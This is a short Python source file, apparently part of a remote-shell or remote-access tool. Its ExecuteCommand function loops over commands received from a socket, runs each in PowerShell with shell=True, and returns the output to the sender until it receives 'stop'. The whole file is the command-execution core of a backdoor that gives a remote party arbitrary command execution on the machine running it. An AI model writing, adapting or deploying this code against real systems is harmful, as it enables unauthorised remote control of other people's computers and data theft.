import subprocess



def ExecuteCommand(mySocket):
    print("[+] Execute commands")
    while True:
        userCommand = mySocket.ReceiveDAta()
        print(userCommand)
        if userCommand == "":
            continue

        if userCommand == "stop":
            break

        output = subprocess.run(["powershell", userCommand], shell=True, capture_output=True)
        if output.stderr.decode('utf-8') == "":
            cmd_result = output.stdout.decode('utf-8')
        else:
            cmd_result = output.stderr.decode("utf-8")

        mySocket.SendCommandResult(cmd_result)
